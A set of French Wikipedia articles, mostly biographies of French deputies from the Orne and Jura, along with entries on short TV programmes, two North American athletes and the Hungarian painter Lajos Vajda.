Roland Boudet, né le à Bubertré et mort le à Caen, est un homme politique français, député de l'Orne et maire de L'Aigle.
Biographie.
Imprimeur, journaliste et directeur du "Réveil normand", journal fondé en 1944, il commence sa carrière politique dans les rangs gaullistes en se portant candidat dans la deuxième circonscription de l'Orne (Mortagne-Laigle) lors des élections législatives de 1958. Arrivé en tête au premier tour, devant l'indépendant Paul Pelleray, il l'emporte aisément au scrutin de ballottage à l'issue d'une quadrangulaire.
À l'Assemblée nationale, il siège dans le groupe de l'Union pour la nouvelle République et dans la commission de la production et des échanges. S'éloignant assez rapidement du gaullisme, il devient non-inscrit puis fait partie des membres fondateurs du Parti libéral européen en 1960.
Lors du scrutin législatif de 1962, il sollicite un nouveau mandat sous cette étiquette et se voit notamment opposer Ernest Voyer, maire de l'Aigle et candidat investi de l'UNR-UDT, qui remporte le second tour dans une triangulaire.
En 1964, après le retrait de Voyer, qui représentait le canton de l'Aigle depuis 1945, il fait son entrée au conseil général de l'Orne puis l'année suivante, il succède à celui-ci à la tête de la cité aiglonne. Il prend enfin sa revanche sur ce dernier en 1967 en reprenant de haute lutte, avec seulement 125 voix d'avance, son ancien siège de député. Le faible écart entre les deux principaux candidats conduit son adversaire à déposer un recours en annulation auprès du Conseil constitutionnel. L'instance accède à la requête et une nouvelle élection est organisée le 24 septembre 1967. Elle voit sa réélection dès le premier tour avec 57,17 % des suffrages.
Devenu membre du Centre démocrate de Jean Lecanuet peu avant, intégrant son comité directeur, il siège alors au sein du groupe Progrès et démocratie moderne.
Reconduit dans ses fonctions parlementaires en 1968, malgré la vague gaulliste, et en 1973, il n'est pas candidat à sa réélection en 1978 et soutient son suppléant Francis Geng, qui remporte le scrutin face au socialiste André Grudet.
Un an plus tard, lors des premières élections européennes, il figure en position (sur 81) sur la liste « Union pour la France en Europe » conduite par Simone Veil.
Constamment réélu à la mairie et au conseil général, il se présente en 1982 dans le nouveau canton de l'Aigle-Est – créé après la division du canton de l'Aigle en deux – comme candidat unique UDF-RPR et bat son concurrent du Parti socialiste.
Défait par André Grudet (PS) aux cantonales de 1988, il reste premier édile de l'Aigle jusqu'en 1989, année où il cède son fauteuil à Maurice Brard, son adjoint aux finances pendant près de dix ans.

</doc>
<doc id="7903507" url="https://fr.wikipedia.org/wiki?curid=7903507" title="Raymond Couder">
Raymond Couder

Raymond Couder, né le et mort le , est un homme politique français.
Biographie.
Fils d'un médecin d'Alençon, Raymond Couder suit les traces de son père et s'inscrit en médecine à Paris. Diplômé en pédiatrie, il revient dans l'Orne et s'y installe. Il crée notamment de service de pédiatrie et le centre des prématurés de l'hôpital d'Alençon.
Mobilisé comme médecin militaire au début de la seconde guerre mondiale, il est fait prisonnier. Libéré et de retour en France en , il ne fait pas mystère de son opposition au régime de Vichy, ce qui lui vaut d'être inquiété par les autorités d'occupation, à tel point qu'il quitte l'Orne pour s'installer chez des parents, dans le Périgord, à l'automne 1942.
A la Libération, il revient dans l'Orne et se présente sur la liste du MRP, menée par Louis Terrenoire, pour l'élection de la première assemblée constituante. Placé en seconde position, il est élu député.
A l'assemblée, il s'intéresse au statut des étudiants en médecine appelés sous les drapeaux et à la réforme des études pharmaceutiques. Il suit aussi de près la rédaction du projet de constitution, réclamant un délai plus raisonnable entre le dépôt des projets et leur examen par l'assemblée. Finalement, cependant, il s'exprime, comme les autres députés MRP, contre le projet adopté, qui est rejeté par le référendum du .
En juin de cette année, il se représente sur la liste menée par Terrenoire, mais accepte de ne figurer qu'en troisième position, ce qui ne lui laisse aucune chance d'être réélu.
Président départemental du MRP pendant toute la Quatrième République, il ne brigue plus sérieusement de mandat. Ainsi, en 1956, il figure cependant de nouveau sur la liste du MRP, mais toujours en troisième position, et donc sans succès.
Son engagement politique prend fin avec le retour de Charles de Gaulle au pouvoir, qu'il n'accepte pas, au contraire de son parti qui le soutient. Il démissionne donc du MRP en 1958.

</doc>
<doc id="7903508" url="https://fr.wikipedia.org/wiki?curid=7903508" title="Michel Devèze (homme politique, 1914-1979)">
Michel Devèze (homme politique, 1914-1979)

Michel Devèze, né le à Paris et mort le à Fresnes, est un historien et homme politique français.
Biographie.
Passé par la Sorbonne et l'École française de Rome, il est professeur agrégé d'Histoire et enseigne au Lycée Michelet de Vanves.
Membre du MRP, il est élu conseiller général de Seine-et-Oise, dans le canton de Sèvres, en 1945, puis député à la première assemblée constituante, où il participe à la commission de la constitution.
Réélu en , il participe à la rédaction du deuxième projet de constitution.
En novembre, il ne se représente pas aux élections législatives, mais conserve une activité politique, y compris au niveau national, puisqu'il participe, entre 1947 et 1948, au cabinet de Maurice Schumann, alors président du conseil.
Il siège par ailleurs au conseil général jusqu'en 1964, avant de s'éloigner de la vie publique et de se consacrer à sa carrière d'historien.

</doc>
<doc id="7903509" url="https://fr.wikipedia.org/wiki?curid=7903509" title="Raymond Guesdon">
Raymond Guesdon

Raymond Guesdon, né le à Passais et mort le à Caen, est un homme politique français.
Biographie.
Après des études primaires et secondaires dans son département, Raymond Guesdon, fils d'hôteliers de l'Orne, fait son droit à Paris, et après l'obtention de sa licence, exerce comme avocat à Domfront, en 1934, puis à Paris en 1936.
Mobilisé au début de la Seconde Guerre mondiale, il réussit à échapper à la capture par les troupes allemandes sur la côte normande en embarquant sur un navire anglais. Arrivé en Grande-Bretagne, il reçoit l'ordre de retourner sur le front, ce qu'il fait.
Rendu à la vie civile à l'été 1940, il reprend sa profession d'avocat. Il défend notamment des juifs et des militants communistes. Cette forme de résistance lui semblant insuffisante, il rejoint en février 1943 les Forces Françaises Libres, au sein du réseau Libération-Nord. Par vengeance, les troupes allemandes incendient sa maison familiale en août 1944.
Son action pendant la guerre lui vaut d'être décoré de la Croix de guerre. Il obtient plus tard la légion d'honneur.
N'ayant pas eu jusque là d'engagement politique, il rejoint cependant le Mouvement de Libération Nationale, puis l'UDSR. C'est finalement par admiration pour Léon Blum qu'il adhère à la SFIO et se présente, sans succès, à l'élection de la première assemblée constituante, dans l'Orne.
En juin 1946, il mène la liste socialiste, et obtient 14,5 % des voix, ce qui est suffisant pour obtenir un siège de député. Réélu en novembre, avec 18,7 % des voix, il consacre l'essentiel de son activité parlementaire à la commission des finances, où il siège pendant tout son mandat, et dont il est un des piliers. Il est notamment, à partir de 1948, rapporteur du budget des dépenses militaires.
Cela ne l'empêche pas d'intervenir ponctuellement sur d'autres sujets, notamment la question des loyers et des relations entre bailleurs et locataires.
En 1951, il mène une liste de « défense républicaine », sur laquelle il abandonne la référence à la SFIO au profit de celle « d'indépendant de gauche », qui n'obtient que 13,7 % des voix, et perd son siège de député. Renouant avec la SFIO, il tente de nouveau sa chance en 1956, mais avec 14,9 % des voix, il fait les frais du système des apparentements qui donne tous les sièges aux listes du MRP et de la droite.
Après cet échec, il rejoint le Parti radical, et sous cette étiquette, tente une dernière fois sa chance aux législatives de 1958, sans succès.
Il est cependant cette même année élu maire de Lonlay-l'Abbaye, là où il avait constitué un maquis pendant la guerre, fonction qu'il n'exerce que pendant un mandat, jusqu'en 1965.

</doc>
<doc id="7903510" url="https://fr.wikipedia.org/wiki?curid=7903510" title="Émile Janvier">
Émile Janvier

Émile Janvier, né le à Paris et mort le à Saint-Denis-sur-Sarthon (Orne), est un homme politique français.

</doc>
<doc id="7903511" url="https://fr.wikipedia.org/wiki?curid=7903511" title="Henri Jouffroy (homme politique)">
Henri Jouffroy (homme politique)

Henri Jouffroy, né le à Chissey-sur-Loue (Jura) et mort le à Dole (Jura), est un homme politique français.
Biographie.
Issu d’une vieille famille franc-comtoise, Henri Jouffroy naît le à Chissey-sur-Loue. Après le Certificat d'études, il fréquente l'école du bois à Mouchard (Jura), mais son parcours scolaire est interrompu en septembre 1918 lorsque ce dernier choisit de s’engager volontairement dans l’armée pour une durée de quatre ans. À son retour dans la vie civile, Henri Jouffroy prend la tête de l'exploitation agricole familiale et se lance en parallèle dans la télégraphie sans fil (TSF). Ses responsabilités locales l’amènent à partir des années 1930 à présider le syndicat des eaux du Val d’Amour, celui de l’assainissement de la Loue, la caisse locale de crédit agricole de Montbarrey et la caisse locale des assurances mutuelles de Bourgogne-Franche-Comté. Après la Libération, Henri Jouffroy assume en outre des responsabilités politiques : de 1947 à 1974, il est élu maire de Chissey-sur-Loue. De 1949 à 1973, il siège également au conseil général du Jura (canton de Montbarrey).  
En 1968, Jacques Duhamel, alors maire de Dole et député sortant de la circonscription du département, propose à Henri Jouffroy d’être son suppléant et de défendre avec lui les couleurs de Progrès et Démocratie moderne. Les deux hommes se placent très largement en tête du premier tour en recueillant 48,5 % des suffrages exprimés contre 28,3 % pour le candidat de l’UDR Robert Grossmann, 14,3 % pour le communiste Maurice Faivre-Picon, 5,9 % pour le socialiste Jean Cordier et 1,9 % pour Alain Deshayes du PSU. Bénéficiant de leur très large avance et du retrait du candidat gaulliste, Jacques Duhamel et Henri Jouffroy remportent une victoire sans appel avec plus de 70,5 % des voix. 
En 1969, Jacques Duhamel est appelé par Georges Pompidou au poste de ministre de l’Agriculture. Henri Jouffroy le remplace à l’Assemblée à partir du . Il s’inscrit au groupe Progrès et démocratie moderne. Dès son arrivée au Palais-Bourbon, il accède à la commission de la production et des échanges qu’il quitte en pour celle des lois constitutionnelles, de la législation et l’administration générale de la République, à laquelle il siège pendant trois mois avant de retrouver la Commission de la production et des échanges où il demeure jusqu’à la fin de la législature. Le député de Dole est également membre de la commission spéciale chargée d’examiner la proposition puis le projet de loi d’orientation du commerce en 1972. Il dépose enfin une proposition de loi relative à l’attribution de congés aux parents adoptifs à l'occasion de l’arrivée au foyer de l’enfant adopté en . 
Lors des grands scrutins de la législature, il vote dans un sens favorable aux gouvernements, qu’il s’agisse du renforcement de la garantie des droits individuels des citoyens du , de la loi Pleven dite « anticasseurs » du , de la réduction du service national à douze mois du , des déclarations de politique générale du gouvernement Chaban-Delmas des et ou du vote sur la création des régions le .
En 1973, Jacques Duhamel se présente à nouveau aux électeurs de Dole sous l’étiquette Centre Démocratie et Progrès avec, toujours pour suppléant, Henri Jouffroy. Ils obtiennent 29 597 voix sur 60 045 soit un score de 49,3 %, se plaçant ainsi loin devant le socialiste Jean-Pierre Santa Cruz (18,6 % des suffrages exprimés), le communiste Pierre Genestier (16 %), le Centre Indépendant Emile Fumey (7,2 %), le Radical socialiste Robert Potier (6,3 %) et Gérard Jeannin de Lutte Ouvrière (2,6 %). Au second tour, malgré l’unité de la gauche, Jacques Duhamel bat son adversaire socialiste en remportant 58,1 % des voix.
Le , le député de Dole s’éteint à l’âge de 52 ans des suites d’une sclérose en plaques. Henri Jouffroy est appelé à le remplacer à l’Assemblée. Il s’inscrit au groupe des réformateurs, des centristes et des démocrates sociaux et rejoint la Commission des affaires culturelles, familiales et sociales. S’il ne prend pas la parole en séance publique au cours de ces quelques mois, Henri Jouffroy siège comme membre suppléant ou titulaire de plusieurs commissions mixtes paritaires sur des sujets plutôt sociaux (le statut des salariés candidats ou élus à l'Assemblée nationale ou au Sénat, la réforme hospitalière, la généralisation de la sécurité sociale, le personnel exerçant dans des établissements spécialisés pour enfants et adolescents handicapés). 
Henri Jouffroy s’éteint le à l’âge de 95 ans. Il était Chevalier de la Légion d'honneur, Officier du Mérite national, du Mérite agricole, de l’ordre des Palmes académiques et décoré de la médaille d’argent communale et départementale. 

</doc>
<doc id="7903512" url="https://fr.wikipedia.org/wiki?curid=7903512" title="Max Montagne">
Max Montagne

Max Montagne, né le et mort le , est un homme politique français.
Biographie.
Après des études de médecine suivies à Paris, Max Montagne s'installe dans le Jura en 1948 et y exerce comme chirurgien hospitalier.
Son engagement en politique est lié à l'agonie de la Quatrième république. Partisan du retour de Charles de Gaulle au pouvoir, il participe dès le début de l'été à la mise en place d'un groupement politique gaulliste, la Convention républicaine, avant d'adhérer dès octobre 1958 à l'UNR, dont il devient le président départemental.
Candidat aux législatives de novembre dans la deuxième circonscription du Jura, il affronte le sortant communiste André Barthélémy,  l'ancien député Jean Courtois (SFIO) et le sénateur-maire de Dole, Charles Laurent-Thouvererey. Arrivé second au premier tour, avec seulement 19,4 % des voix, il bénéficie au second du soutien du MRP et du CNI, ce qui lui permet de l'emporter, dans une triangulaire, avec 48,9 %.
Assez typique des députés « godillots », Max Montagne ne dépose aucun texte et n'intervient pas en tribune pendant toute la législature, se contentant d'apporter un soutien systématique au gouvernement dans ses votes.
En 1959, il est élu maire de Syam, un petit village de 300 habitants.
En 1962, il affronte de nouveau André Barthélémy, ainsi qu'une jeune étoile montante du centrisme, Jacques Duhamel. Arrivé en tête du premier tour avec 29,5 % des voix, il est battu au second tour par Duhamel, qui obtient 52,5 % des voix, sans doute grâce à l'apport de voix de gauche, y compris communistes.
En 1965, il ne se représente pas aux municipales dans son village, pas plus qu'il ne tente de reprendre son siège de député en 1967.
En 1968, il aide Robert Grossmann, président de l'Union des jeunes pour le progrès, à s'implanter dans le Jura en se présentant comme son suppléant aux législatives. Cet apport ne suffit cependant pas à mettre réellement en difficulté Duhamel, qui obtient 48,5 % au premier tour, et bénéficie du désistement de Grossmann au second pour être réélu.
Max Montagne s'éloigne alors de la vie politique pour se consacrer à son activité professionnelle.

</doc>
<doc id="7903513" url="https://fr.wikipedia.org/wiki?curid=7903513" title="Jacques Roulleaux-Dugage">
Jacques Roulleaux-Dugage

Jacques Roulleaux-Dugage, né le et mort le , est un homme politique français.
Biographie.
Jeunesse et études.
Jacques Roulleaux-Dugage est le fils d'Henry, député de l'Orne, et appartient à une famille de notable locaux ayant compté plusieurs parlementaires et élus. Il est aussi le descendant de Beaumarchais, et cousin éloigné de Guy Mollet.
Après des études chez les dominicains de Villebon, puis au Lycée Janson de Sailly, il entre à l'école libre des sciences politiques. Il est titulaire d'un diplôme supérieur de droit public et d'économie politique.
Parcours professionnel.
Il exerce comme avocat de 1948 à 1985, au barreau de Paris.
Mobilisé au début de la Seconde Guerre mondiale, il est en Algérie, en route pour la Syrie, en juillet 1940. Il y sera un temps à Casablanca (Maroc) aide de camp du ministre Georges Mandel alors en mission à la suite de son embarquement à bord du "Massilia". 
Prenant contact rapidement avec la représentation des États-Unis à Alger, il collabore à l'élaboration du plan de débarquement en Afrique du Nord, mais rentre en France avant sa réalisation. Installé dans le Jura depuis la fin 1942, il participe à la résistance intérieure, au sein du réseau Eleuthère, où il s'occupe essentiellement de renseignement.
Son action pendant la guerre lui vaut la légion d'honneur à titre militaire et la croix de guerre. Il aura par la suite de nombreuses autres décorations.
Son oncle, le député de droite Georges Roulleaux-Dugage étant inéligible, il est sollicité pour prendre à l'occasion de l'élection de la première assemblée constituante, en 1945, la tête d'une liste modérée qui obtient 17,2 % des voix, ce qui lui permet d'être élu.
Membre du groupe des Républicains indépendants, son action parlementaire aboutit notamment à la revalorisation de la situation des petits rentiers.
Elu conseiller général de l'Orne, dans le canton de Domfront, et maire de la petite commune de Rouellé, depuis 1945, il ne se représente pas en juin 1946 pour l'élection de la seconde constituante. En novembre, il figure en seconde position sur la liste menée par Philippe Monin, mais n'est pas élu.
Deux ans plus tard, il est élu par les députés membre de l'Assemblée de l'Union Française. Il y préside le petit groupe Paysan d'union sociale, qui est apparenté à celui des Républicains indépendants. Il y siège jusqu'en 1958, et en est vice-président en 1955, puis de 1957 à 1958.
Il participe à la création du CNI dont il est un des principaux animateurs départementaux, jusqu'à la fin des années 1960, et siège au comité directeur de ce parti en 1954.
En 1956, il se présente aux législatives sur la liste CNI menée par deux sortants, anciens du RPF, Paul Pelleray et Pierre Couinaud. Sa troisième position ne lui laisse cependant quasiment aucune chance d'être élu.
En 1958, il est candidat aux législatives dans la première circonscription de l'Orne, remportée par le sortant Louis Terrenoire, et tente de nouveau sa chance en 1962, sans plus de succès, bien qu'il obtienne un bon résultat (31,3 % des voix).
En 1962, il participe activement au lancement du nouveau bulletin du CNI, "Le Journal des Indépendants", dont il possède des parts.
En 1973, cependant, il décide de ne pas se représenter aux cantonales et se retire de la vie politique. Il conserve son mandat de maire jusqu'à sa mort, en 1993. Son épouse, Colette, lui succède.
Aucun de ses enfants, cependant, ne reprend le flambeau. Il est donc le dernier parlementaire de sa lignée.

</doc>
<doc id="7903514" url="https://fr.wikipedia.org/wiki?curid=7903514" title="André Vauchez (homme politique)">
André Vauchez (homme politique)

André Vauchez, né le à Arinthod (Jura) et mort le à Dole (Jura), est un homme politique français.
Biographie.
Il meurt le à l'hôpital de Dole.

</doc>
<doc id="7903515" url="https://fr.wikipedia.org/wiki?curid=7903515" title="Ernest Voyer">
Ernest Voyer

Ernest Voyer, né le à Saint-Loup-sur-Thouet (Deux-Sèvres) et mort le à Chatou (Yvelines), est un homme politique français.
Biographie.
Fils d'un forgeron et d'une agricultrice, Ernest Voyer suit des études primaires jusqu'au certificat d'études.
Mobilisé en 1915, il combat dans l'artillerie jusqu'à la fin de la Première Guerre mondiale.
Puis, il poursuit sa formation par correspondance, obtient de l'Institut électronique de Bruxelles un diplôme de conducteur de travaux, puis d'ingénieur. Il entre à EDF où il poursuivra sa carrière comme chef de service des relations commerciales, jusqu'à sa retraite en 1953.
Dans l'entre-deux-guerres, il participe à la création de la société d'inspiration radicale Le Progrès civique.
Pendant la seconde guerre mondiale, il entre dans la résistance en 1943, et devient responsable du service action du bureau des opérations aériennes dans son secteur, puis intègre les Forces Françaises de l'Intérieur et participe aux combats de libération du Perche.
Maire de L'Aigle en 1945, il entre cette même année au conseil général de l'Orne, dont il devient vice-président, élu dans le canton de L'Aigle.
Il appartient alors à l'UDSR, dont il mène la liste en 1945 pour l'élection de la première assemblée constituante. Avec 16,9 % des voix, il est élu député.
Accaparé par ses mandats locaux, il ne développe cependant pas une grande activité parlementaire. L'année suivante, de nouveau candidat, il voit son résultat électoral s'effondrer : avec seulement 8,2 % des voix, il perd son siège de député.
À la fin de l'année 1946, il participe à la création de l'Union gaulliste, sans grand succès, car il ne parvient pas à constituer une liste pour les législatives de novembre 1946.
Dans la logique de cet engagement gaulliste, il adhère l'année suivante au RPF, mais s'en éloigne rapidement, après que ce parti ait apporté son soutien au financement public des écoles privées.
Pendant toute la quatrième république, il conserve ses mandats locaux, et tente vainement de retrouver un mandat parlementaire.
Ainsi, en 1951, sa liste RGR-UDSR n'obtient que 1,4 % des voix, et sa candidature au Conseil de la République de 1958 n'aboutit pas.
Avec le retour de Charles de Gaulle au pouvoir, il rejoint l'Union pour la Nouvelle République, dont il porte les couleurs pour l'élection du Sénat en 1959, mais sans plus de succès que précédemment.
Réélu maire et conseiller général, il est candidat aux législatives de 1962, et parvient, au second tour, à la faveur d'une triangulaire provoquée par le maintien de Louis Mermaz (UDSR), à battre le sortant Roland Boudet, élu avec l'étiquette gaulliste en 1958, mais qui est passé dans l'opposition, avec 40 % des voix.
A l'assemblée, il est peu actif, sur le modèle des députés « godillots » qui soutiennent systématiquement les positions du gouvernement, posture qui lui est vivement reprochée par ses adversaires.
Les élections suivantes lui sont en revanche défavorable : battu par Boudet aux cantonales de 1964, il perd l'année suivante, toujours au profit du même rival, son poste de maire de L'Aigle.
Dans la logique de cette perte de terrain électoral, il est battu, toujours par Boudet, aux législatives de 1967. Il introduit cependant un recours, compte tenu de l'étroitesse de l'écart au second tour, qui conduit à l'annulation de l'élection. Mais, lors de la partielle de septembre, Boudet est élu au premier tour, avec 57,2 % des voix, tandis que Voyer n'obtient que 23,7 %.
Cet ultime échec signe la fin de sa carrière politique.

</doc>
<doc id="7903519" url="https://fr.wikipedia.org/wiki?curid=7903519" title="Programme court">
Programme court

À la télévision, un programme court est un programme de courte durée (de une à une minute et demi en moyenne, générique inclus) diffusé en inter-programme entre deux émissions et à un horaire régulier, sur le principe du rendez-vous. Souvent utilisé par les chaînes pour générer des revenus sous la forme de parrainages publicitaires avec une marque, chaque programme court est basé sur un thème, un territoire de communication ou des valeurs stratégiques liées au parrain.
Intérêt.
Un programme court permet aux publicitaires de :
Un programme cout est souvent programmé en quotidien ou plusieurs fois par semaine, pendant les carrefours d’audience (heure de grande écoute) pour une exposition maximale.

</doc>
<doc id="7903521" url="https://fr.wikipedia.org/wiki?curid=7903521" title="Jack O'Callahan">
Jack O'Callahan

Jack O'Callahan (né le à Charlestown au Massachusetts aux États-Unis) est un joueur professionnel américain de hockey sur glace qui évoluait au poste de défenseur.
Biographie.
Après deux saisons avec les Terriers de Boston du championnat NCAA de hockey sur glace masculin, Jack O'Callahan est repêché par les Black Hawks de Chicago au du repêchage amateur de la LNH 1977. La même année, il est repêché par les Cowboys de Calgary au du repêchage amateur de l'AMH. Il fait partie de l'équipe américaine ayant battu l'équipe d'URSS lors de la phase finale des Jeux olympiques de 1980 à Lake Placid, l'évènement étant surnommé le « Miracle sur glace ». Il fait ses débuts en tant que professionnel en 1980 avec les Hawks du Nouveau-Brunswick, club-école des Black Hawks dans la Ligue américaine de hockey. En 1982, il débute dans la LNH avec les Black Hawks en jouant 39 des 80 matchs de son équipe. Au total dans la LNH, il a joué sept saisons et 389 matchs en marquant 27 buts et 104 aides pour 131 points en plus d'accumuler 541 minutes de pénalité.

</doc>
<doc id="7903526" url="https://fr.wikipedia.org/wiki?curid=7903526" title="Tommy Kahnle">
Tommy Kahnle

Tommy Kahnle (né le à Latham, New York, États-Unis) est un lanceur de relève droitier des Yankees de New York de la Ligue majeure de baseball.
Carrière.
Joueur des Fighting Knights de l'Université Lynn à Boca Raton en Floride, Tommy Kahnle est un choix de cinquième ronde des Yankees de New York en 2010. Il évolue 4 saisons en ligues mineures dans l'organisation des Yankees, atteignant le niveau Double-A en 2012 et 2013. Il est réclamé au repêchage de la règle 5 par les Rockies du Colorado le .
Kahnle passe du Double-A aux Ligues majeures sans passer par le Triple-A. Il fait ses débuts avec les Rockies du Colorado le face aux Marlins de Miami. Le suivant, le releveur droitier remporte sur les Diamondbacks de l'Arizona sa première victoire dans le baseball majeur.
Le , Coloraod échange Kahnle aux White Sox de Chicago contre le lanceur droitier des ligues mineures Yency Almonte.
Kahnle joue pour les White Sox en 2016 et pour la première moitié de la saison 2017.
Le , les White Sox échangent Kahnle, le joueur de troisième but Todd Frazier et le lanceur droitier David Robertson aux Yankees de New York en retour du lanceur droitier Tyler Clippard et de trois joueurs des ligues mineures : le lanceur gaucher Ian Clarkin et les voltigeurs Tito Polo et Blake Rutherford.
Liens externes.
 

</doc>
<doc id="7903528" url="https://fr.wikipedia.org/wiki?curid=7903528" title="GTLD">
GTLD



</doc>
<doc id="7903530" url="https://fr.wikipedia.org/wiki?curid=7903530" title="Lajos Vajda">
Lajos Vajda

Lajos Vajda (né le à Zalaegerszeg − mort le à Budakeszi) est un peintre et graphiste hongrois. De 1927 à 1930, il est l'élève d'István Csók à l'université hongroise des beaux-arts.
Il séjourne à Paris entre 1930 et 1934 et, outre les tendances les plus récentes de la peinture française, il se familiarise avec les œuvres remarquables du cinéma réaliste russe. Cela l'incite à créer ses photomontages dramatiques sur les grands cataclysmes de l'humanité, la guerre, la faim, la violence armée et la misère noire.
À partir de 1934, il collectionne des motifs d'art populaire à Szentendre et Szigetmonostor. Dans son style, l'art populaire et les symboles chrétiens orthodoxes, catholiques romains et juifs sont combinés avec des éléments abstraits et surréalistes. Ses derniers dessins abstraits surréalistes annoncent les horreurs de la Seconde Guerre mondiale. Il meurt de la tuberculose en 1941.
« Son art est imprégné des questions cruciales de son époque. La principale caractéristique de son picturisme est qu'il marque à la fois les vibrations et les séismes cataclysmiques de l'histoire avec une sensibilité sismographique. Mais la formidable énergie de ces formes rebelles est en guerre contre la destruction jusqu'au dernier moment.»
Biographie.
Situation personnelle.
Lajos Lajda est né dans une famille juive le dans la ville de Zalaegerszeg, alors en Autriche-Hongrie. Il est le fils d'Emánuel Vajda, greffier au tribunal de comté local, et de Judit Fürst. Lajos Vajda a trois frères et sœurs. Selon Júlia Vajda : « Il a commencé à dessiner régulièrement à l'âge de quatre ou cinq ans, dessinant des illustrations de contes de fées après motif. Plus tard, il a réalisé diverses reproductions originales avec une technique précise et disciplinée ». Dans ses premiers dessins, il y a des navires de guerre, des signes de bataille, et plus tard il a capturé son environnement et les membres de sa famille.
En 1916, la famille déménage au royaume de Serbie, alors sous occupation militaire austro-hongroise. À Belgrade, Lajos Vajda fréquente une école serbe, puis une école allemande. Il écrit à son amoureuse, Julia Richter. K. Guvermentalschule in Belgrade, Kraljica Natlia ulica III. und IV. Klasse" . Il réalise ses premiers dessins connus en 1917. Plus tard, sa famille s'installe à Valjevo, une ville de l'ouest de la Serbie.
Selon Júlia Vajda : « Pendant six ans, de 1917 à 23, ils ont été démunis à Belgrade, puis à Valjevo. Lajos a ainsi effectué ses troisième et quatrième années de scolarité élémentaire en allemand, à l'école oszták de Belgrade. Il va également à l'école secondaire en Serbie, et est un excellent élève. Il s'intéresse particulièrement à l'histoire et à la géographie. Il y apprend à connaître les églises orthodoxes grecques et les icônes. À cette époque, il peint principalement des portraits et dessine d'après modèle. Les enseignants et les experts augurent d'un grand avenir pour ce garçon. »
En 1922, Lajos Vajda et sa famille retournent en Hongrie. Emánuel Vajda et Judit Fürst s'installent à Zalaegerszeg puis à Szentendre, tandis que Lajos Vajda étudie à l'école de dessin de Budapest de l'OMIKE, l'Association éducative juive hongroise. Le jeune homme , soutenu par ses professeurs, étudie sous la direction du maître Herman Lipót à l'école libre de l'OMIKE (Association culturelle publique israélite nationale hongroise). 
Les Serbes fuyant les Turcs à la fin du XVIIe siècle sont venus à Szentendre et ont construit « sept églises grecques orthodoxes, qui caractérisent encore l'image de la ville sur le Danube. Les icônes qu'ils contiennent évoquent des souvenirs d'enfance de Vajdas, et leur hanulat imprègne l'univers formel de l'artiste qui s'est déployé ici. » Selon Júlia Vajda, « L'architecture de Szentendre est distinctive en soi. Tout l'être de Lajos, son esprit, était attaché à cette ville, qu'il considérait comme la sienne. ».
En 1925-1926, Laos Vajda tombe malade de la tuberculose osseuse et est opéré sept fois. « À l'âge de dix-sept ans, il est sorti pour peindre, a été surpris par un orage, est rentré trempé jusqu'aux os et n'a pas changé de vêtements. Il tombe alors gravement malade et est hospitalisé peu après, où il est soigné pendant six mois. » 
En 1927, Judit Fürst meurt. « Peu de temps après, en 1927, sa mère, qu'il aimait tendrement et dont il a porté le deuil pour le reste de sa vie, est morte. » Il passe l'été à Valjevo chez son frère, Miklós.
Formation.
En 1928, Laos Vajda intègre l'Académie royale des arts de Hongrie, où il devient l'élève d'István Csók, et se lie d'amitié avec Dezső Korniss, György Kepes, Sándor Trauner et Béla Hegedüs, avec qui il commence à fréquenter les manifestations du cercle "Munka", un groupement d'avant-garde dirigé par Lajos Kassák. D'après Júlia Vajda : « Du point de vue de leur vision du monde, ils étaient socialistes, artistiquement, ils étaient les adeptes du constructivisme. » Il participe à l'exposition des étudiants de l'établissement. Les œuvres qui y sont présentées provoquent les critiques acerbes des artistes conservateurs et des amateurs d'art.
En mai 1929, à l'initiative de professeurs conservateurs, mécontents d'István Csók et de János Vaszary, le Comité de contrôle de l'État mène une enquête à l'Académie, et Lajos Vajda est expulsé du collège avec ses amis. Il participe à l'exposition de la KÚT, groupe de jeunes artistes défendant les tendances modernes de l'art, qui a lieu au Salon national. Les étudiants « expulsés » tentent une représentation commune à la galerie Tamás.
Séjour à Paris.
À l'automne 1930, il se rend à Paris, en France, et y vit jusqu'au printemps 1934, dans un hôtel bon marché du Quartier latin. Il rencontre le philosophe Lajos Szabó qui a une grande influence sur sa démarche artistique. Influencé par Sergei Eisenstein et Vsevolod Pudovkin et réalisant qu'il n'a aucune chance de faire des films, il commence à faire des montages photo. D'après Júlia Vajda : « Ses circonstances matérielles étaient si mauvaises qu'il ne pouvait subvenir à ses besoins qu'avec un régime alimentaire médiocre, et il y eut une période où il ne mangea rien pendant quelques jours et resta au lit à cause de sa faiblesse. / Comme beaucoup d'autres, il fait des petits boulots pour joindre les deux bouts. (...) Ses deux musées préférés sont le musée d'anthropologie, le Musée de l'Homme et le Musée national des Arts asiatiques - Guimet » et « Il n'a pas essayé d'entrer dans le monde de l'art en maîtrisant certains des trucs à la mode de la peinture moderne, le commerce de l'art ».
Retour en Hongrie.
En 1934, il rentre en Hongrie . Les années qui suivent sont difficiles : en raison de ses origines juives et de ses convictions artistiques, Lajos Vajda ne peut pas compter sur le soutien officiel de l'État. Au cours de l'été 1935, il commence à dessiner des motifs de Szentendre et des villages environnants avec le peintre Dezső Korniss. À l'automne 1935, il rencontre l'artiste peintre Júlia Richter, qu'il épouse le .
En 1935-1936, en collaboration avec Dezső Korniss, il développe une nouvelle approche de l'art, visant à créer un nouvel art en Europe centrale et orientale, un pont entre l'Orient et l'Occident, entre la tradition byzantine et préclassique et l'avant-garde. En 1936, il présente son autoportrait emblématique à l'exposition de la KÚT, mais le jury refuse d'exposer sa peinture. « Le jury a rejeté la photo au motif qu'elle était talentueuse mais immature. Deux ans plus tard, la même chose se reproduit. »
Au cours de l'automne 1937, la première exposition en atelier de Lajos Vajda a lieu avec l'aide de Imre Ámos, Margit Anna. Un changement notable dans son art commence vers 1937. Sa relation avec Dezső Korniss se détériore.
En 1937-1938, son père lui retire le soutien financier qui lui avait permis de vivre jusque-là. Il travaille comme artiste de phase pour le film d'animation de Gyula Macskássy pour 30 pengős par semaine.
Maladie et mort.
En septembre, il est appelé au service du travail, mais est libéré au bout de trois semaines en raison de son état de santé. "Il est envoyé au nouvel hôpital St. John. Il est malade depuis huit mois. D'après Júlia Vajda : « (...) Cinq jours avant sa mort, il m'a dit qu'il ne resterait pas une minute de plus à l'hôpital et que je devais le ramener "chez lui", dans mon appartement loué. Le médecin m'a dit que je pouvais le ramener à la maison, que son état était désespéré et que je devais prendre soin de moi. (...) Les locataires de la maison étaient en colère contre moi pour avoir amené un homme mourant dans l'appartement. J'ai appelé le sanatorium de Budakeszi. L'ambulance nous a emmenés là-bas. C'était samedi matin ».
